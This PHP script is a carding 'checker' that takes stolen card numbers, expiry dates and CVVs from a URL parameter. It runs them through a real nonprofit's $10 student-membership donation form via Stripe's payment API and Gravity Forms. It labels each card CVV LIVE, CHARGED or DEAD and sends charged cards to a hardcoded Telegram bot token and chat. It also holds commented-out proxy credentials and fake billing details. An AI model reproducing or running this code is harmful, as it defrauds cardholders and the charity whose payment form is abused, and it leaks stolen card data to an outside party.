<?php 


///--------------------satoru-----------------///


error_reporting(1);
date_default_timezone_set('America/Buenos_Aires');

//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };  


$idd = 
$idd = '1764351005';
//$lista = '4355460264318873|05|2028|247 ';
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";


//================= [ PROXY ] =================//
/*
$curl = curl_init('http://ipv4.webshare.io/'); curl_setopt($curl, CURLOPT_PROXY, '162.254.4.156:6911'); 
curl_setopt($curl, CURLOPT_PROXYUSERPWD, '0KW6T:6MRKSHCH'); curl_exec($curl);
*/
//================= [ CURL REQUESTS ] =================//    
#-------------------[1st REQ]--------------------#


////////////////////////////===[1ST CURL]
$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://blindlgbtpride.org/annual-student-membership-one-time-payment/');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: blindlgbtpride.org',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'cache-control: max-age=0',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryhCrCRppuZ8kJA0TM',
'cookie: __stripe_mid=b0bd05d9-a0fa-47dc-bd2c-b937b507fcf422b881; __stripe_sid=c9f9ed5d-d73f-4819-8186-e66640248f66fea447',
'origin: https://blindlgbtpride.org',
'referer: https://blindlgbtpride.org/annual-student-membership-one-time-payment/',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
///&card[cvc]='.$cvv.'
////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_method_id":6}');

$r1 = curl_exec($ch);
$vh = trim(strip_tags(getStr($r1,'{"common":{"form":{"honeypot":{"version_hash":"','"'))); 
$gkey = trim(strip_tags(getStr($r1,"input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'"))); 
$hdval = trim(strip_tags(getStr($r1,"<input type='hidden' class='gform_hidden' name='state_39' value='","'")));
$nonce = trim(strip_tags(getStr($r1,'"create_payment_intent_nonce":"','"'))); 
$ap = trim(strip_tags(getStr($result1,'"application":"','"')));
//$card = trim(strip_tags(getStr($result1,'"card": { "id": "','"')));
//echo $card;
//echo $si;
//echo $sct;
//echo $hdval;

$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'type=card&billing_details[address][line1]=736+street&billing_details[address][line2]=California&billing_details[address][city]=California&billing_details[address][state]=California&billing_details[address][postal_code]=90023&billing_details[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3ee0577c-fa1a-46eb-a64a-4f213992472fb076dc&muid=b0bd05d9-a0fa-47dc-bd2c-b937b507fcf422b881&sid=c9f9ed5d-d73f-4819-8186-e66640248f66fea447&payment_user_agent=stripe.js%2F1eb7f911ba%3B+stripe-js-v3%2F1eb7f911ba%3B+card-element&referrer=https%3A%2F%2Fblindlgbtpride.org&time_on_page=56217&key=pk_live_51CaFpPA5kmawXVxe6wp0oobimgXF52dVCGYAw0OJbbuqlmGJzvqRbflfmxLnmDlvfmLBucVDF2edQm4Cy0rQgKyy00qfowMSYk');

$result1 = curl_exec($ch);
$data = json_decode($result1, true);

//$id = $data["data"]["intent_id"];
$id = $data["id"];
$crt = $data["created"];
$brnd = $data["card"]["brand"];
$l4 = $data["card"]["last4"];

$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://blindlgbtpride.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: __stripe_mid=b0bd05d9-a0fa-47dc-bd2c-b937b507fcf422b881; __stripe_sid=c9f9ed5d-d73f-4819-8186-e66640248f66fea447',
'origin: https://blindlgbtpride.org',
'referer: https://blindlgbtpride.org/annual-student-membership-one-time-payment/',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'x-requested-with: XMLHttpRequest',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=California&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=US&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=736+street&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=California&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=90023&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=California&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D='.$brnd.'&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=prepaid&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D=4026&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D=visa&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=1000&feed_id=19');

$result2 = curl_exec($ch);
$data = json_decode($result2, true);

//$id = $data["data"]["intent_id"];
$pi = $data["data"]["id"];
$scrt = $data["data"]["client_secret"];

$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://blindlgbtpride.org/annual-student-membership-one-time-payment/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: blindlgbtpride.org',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
'cache-control: max-age=0',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryhCrCRppuZ8kJA0TM',
'cookie: __stripe_mid=b0bd05d9-a0fa-47dc-bd2c-b937b507fcf422b881; __stripe_sid=c9f9ed5d-d73f-4819-8186-e66640248f66fea447',
'origin: https://blindlgbtpride.org',
'referer: https://blindlgbtpride.org/annual-student-membership-one-time-payment/',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_1.3"

Badboy
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_1.6"

Chk
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_23"

badboychx1@gmail.com
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_3.1"

736 street
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_3.2"

California
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_3.3"

California
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_3.4"

California,r
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_3.5"

90023
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_3.6"

United States
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_4"

(304) 348-6738
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_5"

(304) 675-8492
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_9"

Fully Sighted
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_11.4"

Email
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_12"

Other
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_13"

Native Hawaiian or Other Pacific Islander
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_47.1"

Annual Student Membership - One Time Payment
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_47.2"

$10.00
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_47.3"

1
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_21"

Stripe
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_46"

No|0
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_50"

$10.00
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_48.5"


------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_37.6"

PayPal Checkout
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="input_37.5"


------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="is_submit_39"

1
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="gform_submit"

39
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="state_39"

'.$hdval.'
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="gform_target_page_number_39"

0
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="gform_source_page_number_39"

1
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":1000}
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$brnd.'
------WebKitFormBoundaryhCrCRppuZ8kJA0TM
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryhCrCRppuZ8kJA0TM---');

$result3 = curl_exec($ch);
$data = json_decode($result3, true);
$reault = ["There was a problem with your submission:"];

echo"$poxySocks4<br>";

/////////// [Bin Lookup] /////////////


    $msg5 = trim(strip_tags(getStr($result3,'There was a problem with your submission:','.')));
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
if(empty($msg))
{
  $msg = $msg5;
}

echo"$poxySocks4<br>";
//=================== [ RESPONSES ] ===================//


 if (strpos($result3,  '"cvc_check": "pass"')) {
    echo   "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span><span class='text-success'> MSG->[CVV LIVE]</span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result3,  'Thanks for contacting us! We will get in touch with you shortly.')) {
    echo  "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
$time = $info['total_time'];
   $msg = 
    "#LIVE CC: ".$lista." 
    Result: CHARGED\r\n";
    $apiToken = "5959454722:AAFnG4oZXQPKvdeIAsr5mjrsGaJR0CRZYJo";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
  }
  else {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span><span class='text-danger'> MSG->[$msg]</span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
//echo $result2;
  
curl_close($ch);
ob_flush();

?>